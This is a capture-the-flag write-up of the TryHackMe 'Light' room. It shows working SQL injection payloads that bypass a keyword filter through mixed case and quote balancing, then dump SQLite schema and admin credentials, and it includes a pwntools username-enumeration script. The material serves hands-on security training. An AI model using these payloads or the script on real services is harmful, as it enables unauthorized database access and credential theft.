# **Easy - Welcome to the Light database application!**
https://tryhackme.com/room/lightroom

I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using ``nc 10.10.22.91 1337``
You can use the username smokey in order to get started.

# Reconnaissance
Target: ``10.10.22.91``

We connect with
``nc 10.10.22.91 1337``
and enter username smokey gives us 

```
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```
Only SSH and the custom 1337 service
```
sudo nmap -p- 10.10.73.73
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 05:19 EDT
Nmap scan report for 10.10.73.73
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 422.69 seconds
```

# Findings
- We try some obious admin credentails, no luck.
- We try the username and password with SSH, no luck.
- We hit it with a large username list, we get users like alice although no admin. included the script below.
- We hit with some SQLi and find there is some custom filtering, the most likely entry

```
Please enter your username: ``' or 1=1 --``
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```
# Exploiting Findings

Find some weakness in the filtering we remove -- to find it by-passes filter but we get an error, 
```
Please enter your username: ' or 1=1 
Error: unrecognized token: "' LIMIT 30"

Please enter your username: ' or '1'='1' 
Error: unrecognized token: "'1'' LIMIT 30"
```
Ahh get around the sytax error with
```
Please enter your username: ' or '1'='1  
Password: tF8tj2o94WE4LKC
```

Now what SQLtype? more filtering to overcome 
```
Please enter your username: ' UNION SELECT @@version'
Ahh there is a word in there I don't like :( 
```
Union Select Looks to bypass filters, 

```
Please enter your username: SELECT                                                                                                                                                                                                                                     
Ahh there is a word in there I don't like :(                                                                                                                                                                                                                           
Please enter your username: UNION                                                                                                                                                                                                                                      
Ahh there is a word in there I don't like :(                                                                                                                                                                                                                           
Please enter your username: Select                                                                                                                                                                                                                                     
Username not found.                                                                                                                                                                                                                                                    
Please enter your username: Union                                                                                                                                                                                                                                      
Username not found.                                                                                                                                                                                                                                                    
Please enter your username:      
```

back to find SQL type

MySQL
```
Please enter your username: ' Union Select @@version'                                                                                                                                                                                                                  
Error: unrecognized token: "@"  
```

PostgreSQL
```
Please enter your username: ' Union Select version()'                                                                                                                                                                                                                  
Error: no such function: version      
```

SQLite - Bingo we get a hit
```
Please enter your username: ' Union Select sqlite_version()'                                                                                                                                              
Password: 3.31.1  
```

Find the table name
```
Please enter your username: ' UnIoN SeLeCt name FROM sqlite_master WHERE type='table
Password: admintable
```

Find the columns name
```
Please enter your username: ' UnIoN SeLeCt sql FROM sqlite_master WHERE name='admintable
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

What is the admin username?
```
Please enter your username: ' UnIoN SeLeCt username FROM admintable'
Password: ##########
```
What is the password to the username mentioned in question 1?
```
Please enter your username: ' UnIoN SeLeCt password FROM admintable where username = '##########
Password: ##########
```

What is the flag?
```
Please enter your username: ' UnIoN SeLeCt password FROM admintable'
Password: ##########
```
# Summary 
Nice room to show why custom frameworks for preventing SQLi is a bad idea, took me a bit to long to start with SQLi and was focused on Bruteforcing. Including bruteforcing script below as while it didn't work it's a good showcase for pwntools 


# failed exploration 

## Setting up pwntools for kali 
```
mkdir /home/kali/pwntools
python3 -m venv /home/kali/pwntools
home/kali/pwntools/bin/pip install pwntools pwntools\nsource /home/kali/pwntools/bin/activate

```
## bruteforce script
``nano lightbrute.py``

```
from pwn import *
import requests

# Target details
host = "10.10.22.91"
port = 1337
username_url = "https://raw.githubusercontent.com/jeanphorn/wordlist/refs/heads/master/usernames.txt"

# Download the username list
print("[*] Downloading username list...")
try:
    response = requests.get(username_url, timeout=10)
    response.raise_for_status()
    usernames = response.text.splitlines()
    print(f"[+] Loaded {len(usernames)} usernames.")
except requests.RequestException as e:
    print(f"[!] Failed to download usernames: {e}")
    exit(1)

# Start a single session
print(f"[*] Connecting to {host}:{port}...")
conn = remote(host, port, timeout=5)

# Read initial welcome message
welcome_message = conn.recvuntil(b"Please enter your username:").decode().strip()
print(f"[+] Received: {welcome_message}")

# Try each username in the same session
for username in usernames:
    print(f"[*] Trying username: {username}")
    
    conn.sendline(username)  # Send the username
    response = conn.recvuntil(b"Please enter your username:").decode().strip()  # Read the response

    print(f"[+] {username} → {response}")

    if "Username not found." not in response:
        print(f"\n🔥 Possible valid username found: {username} 🔥\n")
        break  # Stop once a valid username is found

# Close connection
conn.close()
print("[*] Username enumeration completed.")

```

``python3 lightbrute.py``










